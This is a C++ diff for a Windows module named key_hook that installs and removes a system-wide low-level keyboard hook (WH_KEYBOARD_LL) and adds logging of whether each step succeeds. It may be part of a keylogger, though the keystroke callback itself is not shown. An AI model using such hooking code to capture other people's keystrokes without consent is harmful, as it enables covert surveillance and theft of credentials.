@@ -3,6 +3,7 @@
 
 #include <windows.h>
 #include "key_proc.h"
+#include "file_handler.h"
 
 namespace key_hook
 {
@@ -12,7 +13,11 @@ namespace key_hook
     {
         hhook = SetWindowsHookExW(WH_KEYBOARD_LL, key_proc::kbdproc, NULL, 0);
         if (hhook == NULL)
+        {
+            file_handler::write_logs("Can't install Hook");
             return false;
+        }
+        file_handler::write_logs("Successfully installed Hook");
         return true;
     }
 
@@ -22,8 +27,10 @@ namespace key_hook
         if ((bool)check)
         {
             hhook = NULL;
+            file_handler::write_logs("Successfully uninstalled Hook");
             return true;
         }
+        file_handler::write_logs("Can't uninstall Hook");
         return false;
     }
 
